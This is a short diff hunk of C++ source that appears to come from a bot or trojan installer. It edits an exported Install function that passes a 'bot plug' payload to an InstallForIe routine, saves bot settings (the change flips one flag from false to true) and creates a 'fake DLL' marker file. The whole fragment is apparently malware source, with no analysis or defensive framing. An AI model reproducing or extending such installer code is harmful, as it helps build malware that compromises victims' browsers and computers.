@@ -604,7 +604,7 @@ extern "C" BOOL WINAPI Install( BYTE* bodyBotPlug, DWORD sizeBotPlug )
 	DWORD res = InstallForIe( bodyBotPlug, sizeBotPlug );
 	if( res )
 	{
-		BOT::SaveSettings(true, false, false);
+		BOT::SaveSettings(true, false, true);
 		Bot->CreateFileA( 0, GetStr(EStrFakeDllFlag).t_str() );
 	}
 	return res;
